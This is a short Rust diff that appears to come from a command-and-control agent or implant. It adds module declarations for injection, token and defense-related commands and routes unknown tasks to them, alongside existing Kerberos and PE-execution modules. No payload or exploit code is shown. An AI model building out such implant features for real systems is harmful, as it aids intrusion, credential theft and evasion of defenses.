@@ -6,6 +6,14 @@
 mod kerberos;
 #[path = "pe_exec.rs"]
 mod pe_exec;
+#[path = "commands_injection.rs"]
+mod commands_injection;
+#[path = "commands_tokens.rs"]
+mod commands_tokens;
+#[path = "commands_defense.rs"]
+mod commands_defense;
+#[path = "commands_utils.rs"]
+mod commands_utils;
 
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -674,6 +682,11 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             t.send_result(task.id, &r, "");
         }
         _ => {
+            // Delegate to feature modules
+            if commands_injection::dispatch(t, task) { return; }
+            if commands_tokens::dispatch(t, task) { return; }
+            if commands_defense::dispatch(t, task) { return; }
+            if commands_utils::dispatch(t, task) { return; }
             t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
         }
     }
